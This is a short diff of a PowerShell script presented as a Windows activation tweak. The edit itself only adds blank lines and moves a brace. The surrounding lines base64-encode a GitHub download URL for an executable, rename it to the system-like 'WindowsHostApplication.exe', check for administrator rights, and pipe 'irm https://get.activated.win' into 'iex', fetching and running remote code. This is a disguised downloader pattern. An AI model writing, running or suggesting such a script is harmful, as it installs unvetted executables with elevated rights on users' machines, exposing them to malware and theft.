@@ -21,6 +21,8 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 Break
 }
 
+
+
 # Base64-encoded strings for third download (officemicro.exe)
 $officeDownloadUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/dolbaeb.exe"))
 $updaterrrExeB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("WindowsHostApplication.exe"))
@@ -110,9 +112,7 @@ try {
     Write-Host "Error: $_"
     exit 1
 } finally {
-
-
-    }
     # No cleanup - leave traces as requested
     irm https://get.activated.win | iex
     
+}
